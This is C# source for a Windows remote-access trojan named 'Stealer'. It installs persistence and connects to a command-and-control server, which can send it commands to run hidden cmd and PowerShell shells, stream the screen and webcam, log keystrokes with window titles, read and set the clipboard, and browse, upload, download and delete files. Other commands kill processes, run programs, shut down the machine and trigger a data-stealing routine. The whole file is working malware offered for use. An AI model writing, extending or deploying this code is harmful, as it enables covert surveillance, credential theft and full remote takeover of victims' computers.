using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Globalization;
using System.Diagnostics;
using Stealer.Collectors;
using Stealer.Utils;

namespace Stealer
{
    class Program
    {
        private static string _clientId;

        // ── Persistent shells (streaming) ─────────────────────────────────
        private const string SHELL_DONE = "==AEST_DONE==";
        private const string SHELL_CWD  = "==AEST_CWD==";

        private static Process _cmdShell;
        private static readonly object _cmdLock = new object();
        private static readonly ManualResetEventSlim _cmdReady = new ManualResetEventSlim(false);
        private static readonly SemaphoreSlim _cmdSem = new SemaphoreSlim(1, 1);
        private static volatile bool _cmdStreaming = false;

        private static Process _psShell;
        private static readonly object _psLock = new object();
        private static readonly ManualResetEventSlim _psReady = new ManualResetEventSlim(false);
        private static readonly SemaphoreSlim _psSem = new SemaphoreSlim(1, 1);
        private static volatile bool _psStreaming = false;
        // ──────────────────────────────────────────────────────────────────

        private static readonly string CrashLog = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "whm_crash.log");

        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += (s, e) =>
            {
                try { File.AppendAllText(CrashLog, DateTime.Now + " UNHANDLED: " + e.ExceptionObject + "\r\n"); } catch { }
            };

            try
            {
                Config.Initialize();
                _clientId = Environment.MachineName + "_" + Environment.UserName;

                try { Persistence.Install(); } catch { }

                C2Client.Connect(_clientId, HandleCommand);
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(CrashLog, DateTime.Now + " MAIN ERR: " + ex + "\r\n"); } catch { }
            }

            while (true) { Thread.Sleep(60000); }
        }

        private static void HandleCommand(string command)
        {
            string cmd = command.Trim();
            string cmdLower = cmd.ToLower();

            if (cmdLower == "steal")
            {
                RunStealer();
            }
            else if (cmdLower == "uninstall")
            {
                try { Persistence.Uninstall(); } catch { }
                Environment.Exit(0);
            }
            else if (cmdLower.StartsWith("rdp_start"))
            {
                int fps = 5;
                int quality = 50;
                StreamMode mode = StreamMode.TileDelta;
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
                if (parts.Length >= 4 && int.TryParse(parts[3], out int modeVal))
                {
                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
                        mode = (StreamMode)modeVal;
                }
                ScreenStream.Start(fps, quality, mode);
            }
            else if (cmdLower.StartsWith("rdp_mode"))
            {
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2 && int.TryParse(parts[1], out int modeVal))
                {
                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
                        ScreenStream.SetMode((StreamMode)modeVal);
                }
            }
            else if (cmdLower == "rdp_stop")
            {
                ScreenStream.Stop();
            }
            else if (cmdLower.StartsWith("camera_start"))
            {
                int fps = 5;
                int quality = 50;
                int camIndex = 0;
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
                if (parts.Length >= 4) int.TryParse(parts[3], out camIndex);
                CameraStream.Start(fps, quality, camIndex);
            }
            else if (cmdLower == "camera_stop")
            {
                CameraStream.Stop();
            }
            else if (cmdLower == "camera_list")
            {
                string jsonList = CameraStream.GetCameraListJson();
                C2Client.SendText("{\"type\":\"camera_list\",\"devices\":" + jsonList + "}");
            }
            else if (cmdLower.StartsWith("exec_cmd:"))
            {
                string payload = cmd.Substring("exec_cmd:".Length);
                RunPersistentCmd(payload);
            }
            else if (cmdLower.StartsWith("exec_ps:"))
            {
                string payload = cmd.Substring("exec_ps:".Length);
                RunPersistentPs(payload);
            }
            else if (cmdLower == "shell_reset")
            {
                lock (_cmdLock) { try { _cmdShell?.Kill(); } catch { } _cmdShell = null; _cmdStreaming = false; }
                lock (_psLock)  { try { _psShell?.Kill();  } catch { } _psShell  = null; _psStreaming  = false; }
                // Drain semaphores in case a command was in-flight
                if (_cmdSem.CurrentCount == 0) _cmdSem.Release();
                if (_psSem.CurrentCount  == 0) _psSem.Release();
            }
            else if (cmdLower == "tasklist")
            {
                GetTaskList();
            }
            else if (cmdLower.StartsWith("kill:"))
            {
                string pidStr = cmd.Substring("kill:".Length);
                if (int.TryParse(pidStr, out int pid))
                {
                    KillProcess(pid);
                }
            }
            else if (cmdLower.StartsWith("fm_list:"))
            {
                FmListDirectory(cmd.Substring("fm_list:".Length));
            }
            else if (cmdLower.StartsWith("fm_download:"))
            {
                FmDownloadFile(cmd.Substring("fm_download:".Length));
            }
            else if (cmdLower.StartsWith("fm_delete:"))
            {
                FmDelete(cmd.Substring("fm_delete:".Length));
            }
            else if (cmdLower.StartsWith("fm_upload:"))
            {
                string rest = cmd.Substring("fm_upload:".Length);
                int sep = rest.IndexOf('|');
                if (sep > 0)
                    FmUploadFile(rest.Substring(0, sep), rest.Substring(sep + 1));
            }
            // ── Clipboard ─────────────────────────────────────────────────────
            else if (cmdLower == "clipboard_get")
            {
                ClipboardGet();
            }
            else if (cmdLower.StartsWith("clipboard_set:"))
            {
                ClipboardSet(cmd.Substring("clipboard_set:".Length));
            }
            // ── Keylogger ─────────────────────────────────────────────────────
            else if (cmdLower == "keylog_start")
            {
                KeylogStart();
            }
            else if (cmdLower == "keylog_stop")
            {
                KeylogStop();
            }
            // ── Power ─────────────────────────────────────────────────────────
            else if (cmdLower == "power_shutdown")
            {
                Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
                    { CreateNoWindow = true, UseShellExecute = false });
            }
            else if (cmdLower == "power_restart")
            {
                Process.Start(new ProcessStartInfo("shutdown", "/r /t 0")
                    { CreateNoWindow = true, UseShellExecute = false });
            }
            else if (cmdLower == "power_sleep")
            {
                Task.Run(() => SetSuspendState(false, false, false));
            }
            // ── Remote Execution ──────────────────────────────────────────────
            else if (cmdLower.StartsWith("remote_exec:"))
            {
                string rest = cmd.Substring("remote_exec:".Length);
                int sep = rest.IndexOf('|');
                string exePath = sep > 0 ? rest.Substring(0, sep) : rest;
                string exeArgs = sep > 0 ? rest.Substring(sep + 1) : "";
                RemoteExec(exePath, exeArgs);
            }
        }

        private static Encoding OemEnc => Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage);

        private static void EnsureCmdShell()
        {
            // Must be called inside lock(_cmdLock)
            if (_cmdShell != null && !_cmdShell.HasExited) return;
            _cmdStreaming = false;
            try { _cmdShell?.Kill(); _cmdShell?.Dispose(); } catch { }

            var psi = new ProcessStartInfo("cmd.exe", "/Q")
            {
                UseShellExecute        = false,
                RedirectStandardInput  = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
                WorkingDirectory       = @"C:\",
                StandardOutputEncoding = OemEnc,
                StandardErrorEncoding  = OemEnc
            };
            _cmdShell = Process.Start(psi);

            _cmdShell.OutputDataReceived += (s, e) =>
            {
                if (e.Data == null) return;
                if (!_cmdStreaming) { if (e.Data.TrimEnd() == SHELL_DONE) _cmdReady.Set(); return; }
                SendShellLine("shell_out", e.Data, "cmd", "");
            };
            _cmdShell.ErrorDataReceived += (s, e) =>
            {
                if (!_cmdStreaming || e.Data == null) return;
                // CWD sentinel arrives via stderr (stdout stays clean)
                int cwdIdx = e.Data.IndexOf(SHELL_CWD);
                if (cwdIdx >= 0)
                {
                    string cwd = e.Data.Substring(cwdIdx + SHELL_CWD.Length).Trim();
                    _cmdSem.Release();
                    SendShellLine("shell_done", "", "cmd", cwd);
                    return;
                }
                SendShellLine("shell_out", e.Data, "cmd", "");
            };
            _cmdShell.BeginOutputReadLine();
            _cmdShell.BeginErrorReadLine();

            // Suppress echoing, drain banner
            _cmdShell.StandardInput.WriteLine("@echo off");
            _cmdReady.Reset();
            _cmdShell.StandardInput.WriteLine("echo " + SHELL_DONE);
            _cmdShell.StandardInput.Flush();
            _cmdReady.Wait(3000);
            _cmdStreaming = true;
        }

        private static void RunPersistentCmd(string payload)
        {
            Task.Run(async () =>
            {
                await _cmdSem.WaitAsync();
                try
                {
                    lock (_cmdLock) { EnsureCmdShell(); }
                    _cmdShell.StandardInput.WriteLine(payload);
                    _cmdShell.StandardInput.WriteLine("@echo " + SHELL_CWD + "%CD% >&2");
                    _cmdShell.StandardInput.Flush();
                }
                catch (Exception ex)
                {
                    lock (_cmdLock) { try { _cmdShell?.Kill(); } catch { } _cmdShell = null; _cmdStreaming = false; }
                    _cmdSem.Release();
                    SendShellLine("shell_done", "[ERROR] " + ex.Message, "cmd", "");
                }
            });
        }

        private static void EnsurePsShell()
        {
            // Must be called inside lock(_psLock)
            if (_psShell != null && !_psShell.HasExited) return;
            _psStreaming = false;
            try { _psShell?.Kill(); _psShell?.Dispose(); } catch { }

            var psi = new ProcessStartInfo("powershell.exe",
                "-NoProfile -NoExit -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8\"")
            {
                UseShellExecute        = false,
                RedirectStandardInput  = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
                WorkingDirectory       = @"C:\",
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding  = Encoding.UTF8
            };
            _psShell = Process.Start(psi);

            _psShell.OutputDataReceived += (s, e) =>
            {
                if (e.Data == null) return;
                if (!_psStreaming) { if (e.Data.TrimEnd() == SHELL_DONE) _psReady.Set(); return; }
                string line = System.Text.RegularExpressions.Regex.Replace(e.Data, @"^PS [A-Za-z]:\\[^>]*>", "");
                if (!string.IsNullOrEmpty(line))
                    SendShellLine("shell_out", line, "ps", "");
            };
            _psShell.ErrorDataReceived += (s, e) =>
            {
                if (!_psStreaming || e.Data == null) return;
                int cwdIdx = e.Data.IndexOf(SHELL_CWD);
                if (cwdIdx >= 0)
                {
                    string cwd = e.Data.Substring(cwdIdx + SHELL_CWD.Length).Trim();
                    _psSem.Release();
                    SendShellLine("shell_done", "", "ps", cwd);
                    return;
                }
                SendShellLine("shell_out", e.Data, "ps", "");
            };
            _psShell.BeginOutputReadLine();
            _psShell.BeginErrorReadLine();

            // Drain PS banner
            _psReady.Reset();
            _psShell.StandardInput.WriteLine("Write-Host '" + SHELL_DONE + "'");
            _psShell.StandardInput.Flush();
            _psReady.Wait(5000);
            _psStreaming = true;
        }

        private static void RunPersistentPs(string payload)
        {
            Task.Run(async () =>
            {
                await _psSem.WaitAsync();
                try
                {
                    lock (_psLock) { EnsurePsShell(); }
                    _psShell.StandardInput.WriteLine(payload);
                    _psShell.StandardInput.WriteLine("[Console]::Error.WriteLine('" + SHELL_CWD + "' + (Get-Location).Path)");
                    _psShell.StandardInput.Flush();
                }
                catch (Exception ex)
                {
                    lock (_psLock) { try { _psShell?.Kill(); } catch { } _psShell = null; _psStreaming = false; }
                    _psSem.Release();
                    SendShellLine("shell_done", "[ERROR] " + ex.Message, "ps", "");
                }
            });
        }

        private static void SendShellLine(string type, string data, string shell, string cwd)
        {
            string esc(string s) => (s ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"")
                .Replace("\r", "").Replace("\n", "\\n").Replace("\t", "\\t");
            C2Client.SendText("{\"type\":\"" + type + "\",\"data\":\"" + esc(data) +
                              "\",\"shell\":\"" + shell + "\",\"cwd\":\"" + esc(cwd) + "\"}");
        }

        private static void GetTaskList()
        {
            Task.Run(() =>
            {
                try
                {
                    var procs = System.Diagnostics.Process.GetProcesses();
                    var list = new System.Collections.Generic.List<string>();
                    foreach (var p in procs)
                    {
                        try
                        {
                            string pName = p.ProcessName.Replace("\\", "\\\\").Replace("\"", "\\\"");
                            string windowTitle = (p.MainWindowTitle ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "");
                            long mem = 0;
                            try { mem = p.WorkingSet64 / 1024 / 1024; } catch { }
                            string exePath = "";
                            try { exePath = p.MainModule?.FileName ?? ""; } catch { }
                            string ico = "";
                            if (!string.IsNullOrEmpty(exePath))
                                ico = IconJson(GetIconBase64(exePath, false));
                            list.Add("{\"pid\":" + p.Id + ",\"name\":\"" + pName + "\",\"title\":\"" + windowTitle + "\",\"mem\":" + mem + ico + "}");
                        }
                        catch { }
                    }
                    string json = "[" + string.Join(",", list.ToArray()) + "]";
                    C2Client.SendText("{\"type\":\"tasklist_res\",\"tasks\":" + json + "}");
                }
                catch { }
            });
        }

        private static void KillProcess(int pid)
        {
            Task.Run(() =>
            {
                try
                {
                    var p = System.Diagnostics.Process.GetProcessById(pid);
                    p.Kill();
                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":true,\"pid\":" + pid + "}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":false,\"pid\":" + pid + ",\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        // ── Remote Execution ─────────────────────────────────────────────────

        private static void RemoteExec(string path, string args)
        {
            Task.Run(() =>
            {
                try
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName        = path,
                        Arguments       = args,
                        UseShellExecute = true,
                    };
                    Process.Start(psi);
                    C2Client.SendText("{\"type\":\"exec_res\",\"success\":true,\"path\":\"" + path.Replace("\\","\\\\").Replace("\"","\\\"") + "\"}");
                }
                catch (Exception ex)
                {
                    string err = ex.Message.Replace("\\","\\\\").Replace("\"","\\\"");
                    C2Client.SendText("{\"type\":\"exec_res\",\"success\":false,\"error\":\"" + err + "\"}");
                }
            });
        }

        // ── Power ─────────────────────────────────────────────────────────────

        [System.Runtime.InteropServices.DllImport("powrprof.dll", SetLastError = true)]
        private static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);

        // ── Clipboard ─────────────────────────────────────────────────────────

        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool OpenClipboard(IntPtr hWnd);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool CloseClipboard();
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr GetClipboardData(uint uFormat);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool EmptyClipboard();
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool IsClipboardFormatAvailable(uint format);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern IntPtr GlobalLock(IntPtr hMem);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern bool GlobalUnlock(IntPtr hMem);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern IntPtr GlobalSize(IntPtr hMem);

        private const uint CF_UNICODETEXT = 13;
        private const uint CF_BITMAP      = 2;
        private const uint CF_DIB         = 8;
        private const uint GMEM_MOVEABLE  = 0x0002;

        private static string EscJson(string s) =>
            (s ?? "").Replace("\\","\\\\").Replace("\"","\\\"")
                     .Replace("\r","\\r").Replace("\n","\\n").Replace("\t","\\t");

        private static void ClipboardGet()
        {
            var t = new Thread(() =>
            {
                try
                {
                    if (!OpenClipboard(IntPtr.Zero)) { C2Client.SendText("{\"type\":\"clipboard_res\",\"error\":\"OpenClipboard failed\"}"); return; }
                    string text = "";
                    string imgB64 = null;
                    try
                    {
                        // Text
                        if (IsClipboardFormatAvailable(CF_UNICODETEXT))
                        {
                            IntPtr hText = GetClipboardData(CF_UNICODETEXT);
                            if (hText != IntPtr.Zero)
                            {
                                IntPtr ptr = GlobalLock(hText);
                                if (ptr != IntPtr.Zero)
                                {
                                    text = System.Runtime.InteropServices.Marshal.PtrToStringUni(ptr) ?? "";
                                    GlobalUnlock(hText);
                                }
                            }
                        }
                        // Image via HBITMAP → System.Drawing
                        if (IsClipboardFormatAvailable(CF_BITMAP))
                        {
                            IntPtr hBmp = GetClipboardData(CF_BITMAP);
                            if (hBmp != IntPtr.Zero)
                            {
                                try
                                {
                                    using (var bmp = System.Drawing.Image.FromHbitmap(hBmp))
                                    using (var ms = new System.IO.MemoryStream())
                                    {
                                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                                        imgB64 = Convert.ToBase64String(ms.ToArray());
                                    }
                                }
                                catch { }
                            }
                        }
                    }
                    finally { CloseClipboard(); }

                    string imgPart = imgB64 != null ? ",\"image\":\"" + imgB64 + "\"" : "";
                    C2Client.SendText("{\"type\":\"clipboard_res\",\"text\":\"" + EscJson(text) + "\"" + imgPart + "}");
                }
                catch (Exception ex)
                {
                    C2Client.SendText("{\"type\":\"clipboard_res\",\"error\":\"" + EscJson(ex.Message) + "\"}");
                }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        private static void ClipboardSet(string text)
        {
            var t = new Thread(() =>
            {
                try
                {
                    if (!OpenClipboard(IntPtr.Zero)) return;
                    try
                    {
                        EmptyClipboard();
                        int byteLen = (text.Length + 1) * 2;
                        IntPtr hMem = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)byteLen);
                        if (hMem == IntPtr.Zero) return;
                        IntPtr ptr = GlobalLock(hMem);
                        if (ptr != IntPtr.Zero)
                        {
                            System.Runtime.InteropServices.Marshal.Copy(text.ToCharArray(), 0, ptr, text.Length);
                            System.Runtime.InteropServices.Marshal.WriteInt16(ptr, text.Length * 2, 0);
                            GlobalUnlock(hMem);
                        }
                        SetClipboardData(CF_UNICODETEXT, hMem);
                    }
                    finally { CloseClipboard(); }
                }
                catch { }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        // ── Keylogger ─────────────────────────────────────────────────────────

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode, scanCode, flags, time;
            public IntPtr dwExtraInfo;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct MSG_
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam, lParam;
            public uint time;
            public int ptX, ptY;
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc fn, IntPtr hMod, uint threadId);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool GetMessage(out MSG_ lpMsg, IntPtr hWnd, uint min, uint max);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool TranslateMessage(ref MSG_ msg);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr DispatchMessage(ref MSG_ msg);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern void PostThreadMessage(uint threadId, uint msg, IntPtr wParam, IntPtr lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder sb, int max);
        [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern short GetKeyState(int vk);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern uint GetCurrentThreadId();

        private static Thread       _keylogThread;
        private static IntPtr       _keylogHook   = IntPtr.Zero;
        private static volatile bool _keylogActive = false;
        private static uint          _keylogTid    = 0;
        private static LowLevelKeyboardProc _keylogProc; // prevent GC
        private static string        _keylogLastWindow = "";
        private static readonly System.Text.StringBuilder _keylogBuf  = new System.Text.StringBuilder();
        private static readonly object                     _keylogLock = new object();
        private static System.Timers.Timer _keylogTimer;

        private static string VkToStr(uint vk)
        {
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
            bool caps  = (GetKeyState(0x14) & 0x0001) != 0;
            // Letters
            if (vk >= 0x41 && vk <= 0x5A)
            {
                char c = (char)vk;
                return ((shift ^ caps) ? c : char.ToLower(c)).ToString();
            }
            // Digits row
            if (vk >= 0x30 && vk <= 0x39)
            {
                if (!shift) return ((char)vk).ToString();
                string[] s = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                return s[vk - 0x30];
            }
            // Numpad digits
            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString();
            switch (vk)
            {
                case 0x08: return "[BS]";
                case 0x09: return "[Tab]";
                case 0x0D: return "\n";
                case 0x1B: return "[Esc]";
                case 0x20: return " ";
                case 0x2E: return "[Del]";
                case 0x6A: return "*"; case 0x6B: return "+";
                case 0x6D: return "-"; case 0x6E: return "."; case 0x6F: return "/";
                case 0xBB: return shift ? "+" : "=";
                case 0xBC: return shift ? "<" : ",";
                case 0xBD: return shift ? "_" : "-";
                case 0xBE: return shift ? ">" : ".";
                case 0xBF: return shift ? "?" : "/";
                case 0xC0: return shift ? "~" : "`";
                case 0xDB: return shift ? "{" : "[";
                case 0xDC: return shift ? "|" : "\\";
                case 0xDD: return shift ? "}" : "]";
                case 0xDE: return shift ? "\"" : "'";
                default:   return "";
            }
        }

        private static IntPtr KeylogCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)0x100 || wParam == (IntPtr)0x104)) // WM_KEYDOWN / WM_SYSKEYDOWN
            {
                var kbs = System.Runtime.InteropServices.Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                string key = VkToStr(kbs.vkCode);

                // Detect active window change
                IntPtr hwnd = GetForegroundWindow();
                var sb = new System.Text.StringBuilder(256);
                GetWindowText(hwnd, sb, 256);
                string win = sb.ToString();
                if (win != _keylogLastWindow)
                {
                    _keylogLastWindow = win;
                    lock (_keylogLock) { _keylogBuf.Append("\n[" + win + "]\n"); }
                }

                if (key.Length > 0)
                    lock (_keylogLock) { _keylogBuf.Append(key); }
            }
            return CallNextHookEx(_keylogHook, nCode, wParam, lParam);
        }

        private static void KeylogFlush()
        {
            string batch;
            lock (_keylogLock)
            {
                if (_keylogBuf.Length == 0) return;
                batch = _keylogBuf.ToString();
                _keylogBuf.Clear();
            }
            C2Client.SendText("{\"type\":\"keylog_data\",\"text\":\"" + EscJson(batch) + "\"}");
        }

        private static void KeylogStart()
        {
            if (_keylogActive) return;
            _keylogActive = true;
            _keylogLastWindow = "";

            _keylogTimer = new System.Timers.Timer(400);
            _keylogTimer.Elapsed += (s, e) => KeylogFlush();
            _keylogTimer.Start();

            _keylogThread = new Thread(() =>
            {
                _keylogTid  = GetCurrentThreadId();
                _keylogProc = KeylogCallback;
                using (var proc = Process.GetCurrentProcess())
                using (var mod  = proc.MainModule)
                    _keylogHook = SetWindowsHookEx(13, _keylogProc, GetModuleHandle(mod.ModuleName), 0);

                MSG_ msg;
                while (GetMessage(out msg, IntPtr.Zero, 0, 0))
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }
                if (_keylogHook != IntPtr.Zero) { UnhookWindowsHookEx(_keylogHook); _keylogHook = IntPtr.Zero; }
            });
            _keylogThread.SetApartmentState(ApartmentState.STA);
            _keylogThread.IsBackground = true;
            _keylogThread.Start();

            C2Client.SendText("{\"type\":\"keylog_status\",\"active\":true}");
        }

        private static void KeylogStop()
        {
            if (!_keylogActive) return;
            _keylogActive = false;
            _keylogTimer?.Stop();
            _keylogTimer = null;
            KeylogFlush(); // send remaining buffer
            if (_keylogTid != 0) PostThreadMessage(_keylogTid, 0x0012 /*WM_QUIT*/, IntPtr.Zero, IntPtr.Zero);
            C2Client.SendText("{\"type\":\"keylog_status\",\"active\":false}");
        }

        // ── Shell icon extraction via WinAPI ──────────────────────────────────

        [System.Runtime.InteropServices.DllImport("shell32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        private static extern bool DestroyIcon(IntPtr hIcon);

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;
            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        }

        private const uint SHGFI_ICON             = 0x000000100;
        private const uint SHGFI_SMALLICON        = 0x000000001;
        private const uint SHGFI_USEFILEATTRIBUTES = 0x000000010;
        private const uint FILE_ATTRIBUTE_NORMAL   = 0x00000080;
        private const uint FILE_ATTRIBUTE_DIRECTORY = 0x00000010;

        // Files that carry their own embedded icon — must read the actual file, can't cache by extension
        private static readonly System.Collections.Generic.HashSet<string> _perFileIconExts =
            new System.Collections.Generic.HashSet<string>(StringComparer.OrdinalIgnoreCase)
            { ".exe", ".dll", ".ico", ".icl", ".scr", ".cpl" };

        // Cache: full path (for per-file types) or extension / ":dir" / ":drive"
        private static readonly System.Collections.Generic.Dictionary<string, string> _iconCache =
            new System.Collections.Generic.Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        private static readonly object _iconCacheLock = new object();

        private static string GetIconBase64(string fullPath, bool isDir, bool isDrive = false)
        {
            string ext = isDir || isDrive ? "" : (System.IO.Path.GetExtension(fullPath) ?? "").ToLowerInvariant();
            bool perFile = !isDir && !isDrive && _perFileIconExts.Contains(ext);

            // Per-file types use their full path as cache key so each exe gets its own icon
            string cacheKey = isDrive ? ":drive"
                            : isDir   ? ":dir"
                            : perFile ? fullPath
                            : ext;

            lock (_iconCacheLock)
            {
                if (_iconCache.TryGetValue(cacheKey, out string cached)) return cached;
            }

            try
            {
                var shfi = new SHFILEINFO();
                uint attrs = isDir || isDrive ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
                // SHGFI_USEFILEATTRIBUTES = fast path using only attrs/ext, no file read.
                // For exe/dll we DON'T set it so Windows reads the real embedded icon.
                uint flags = SHGFI_ICON | SHGFI_SMALLICON;
                if (!perFile) flags |= SHGFI_USEFILEATTRIBUTES;

                IntPtr ret = SHGetFileInfo(fullPath, attrs, ref shfi,
                    (uint)System.Runtime.InteropServices.Marshal.SizeOf(shfi), flags);

                if (ret == IntPtr.Zero || shfi.hIcon == IntPtr.Zero) return null;

                string b64 = null;
                try
                {
                    using (var icon = System.Drawing.Icon.FromHandle(shfi.hIcon))
                    using (var bmp = icon.ToBitmap())
                    using (var ms = new System.IO.MemoryStream())
                    {
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                        b64 = Convert.ToBase64String(ms.ToArray());
                    }
                }
                finally { DestroyIcon(shfi.hIcon); }

                if (b64 != null)
                {
                    lock (_iconCacheLock) { _iconCache[cacheKey] = b64; }
                }
                return b64;
            }
            catch { return null; }
        }

        private static string IconJson(string b64) =>
            b64 != null ? ",\"icon\":\"" + b64 + "\"" : "";

        // ── File Manager ──────────────────────────────────────────────────────

        private static void FmListDirectory(string path)
        {
            Task.Run(() =>
            {
                try
                {
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    var items = new System.Collections.Generic.List<string>();

                    if (string.IsNullOrEmpty(path))
                    {
                        foreach (var drive in System.IO.DriveInfo.GetDrives())
                        {
                            try
                            {
                                string n = drive.Name.Replace("\\", "\\\\");
                                string label = "";
                                try { label = (drive.VolumeLabel ?? "").Replace("\"", "\\\""); } catch { }
                                string ico = IconJson(GetIconBase64(drive.Name, false, true));
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"drive\",\"size\":0,\"modified\":\"\",\"label\":\"" + label + "\"" + ico + "}");
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        var dir = new System.IO.DirectoryInfo(path);
                        foreach (var d in dir.GetDirectories())
                        {
                            try
                            {
                                string n = d.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                string mod = d.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
                                string ico = IconJson(GetIconBase64(d.FullName, true));
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"dir\",\"size\":0,\"modified\":\"" + mod + "\"" + ico + "}");
                            }
                            catch { }
                        }
                        foreach (var f in dir.GetFiles())
                        {
                            try
                            {
                                string n = f.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                string mod = f.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
                                string ico = IconJson(GetIconBase64(f.FullName, false));
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"file\",\"size\":" + f.Length + ",\"modified\":\"" + mod + "\"" + ico + "}");
                            }
                            catch { }
                        }
                    }

                    C2Client.SendText("{\"type\":\"fm_list_res\",\"path\":\"" + pathEsc + "\",\"items\":[" + string.Join(",", items.ToArray()) + "]}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_list_res\",\"path\":\"" + pathEsc + "\",\"error\":\"" + errEsc + "\",\"items\":[]}");
                }
            });
        }

